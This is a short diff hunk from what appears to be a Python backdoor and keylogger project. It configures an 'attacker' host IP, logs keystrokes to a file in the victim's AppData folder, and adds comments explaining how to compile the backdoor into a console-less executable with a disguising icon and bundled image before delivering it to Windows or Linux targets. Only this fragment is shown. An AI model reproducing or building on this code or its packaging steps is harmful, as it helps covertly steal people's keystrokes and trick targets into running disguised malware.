@@ -10,8 +10,10 @@ import threading
 import pynput.keyboard
 #[!!!!!!!!!!!!!!!] WARNING change it to your own ip host(attacker) and uncomment it
 host_ip = "127.0.0.1" 
-#first before deliver make it exe or linux executable file using pyinstaller --onefile --noconsole backdoor.py
-
+#first before deliver make it exe or linux executable file :
+#Linux User Setup wine environment with python3 directory
+# target is windows then command : wine /root/.wine/drive_c/pyinstaller.exe --add-data IMAGEPATH --onefile --noconsole --icon ICONPATH Backdoor.py 
+# target is linux then command : pyinstaller --add-data IMAGEPATH --onefile --noconsole --icon ICONPATH Backdoor.py 
 keys = ""
 path = os.environ["appdata"]+"\\keylogger.txt"
 
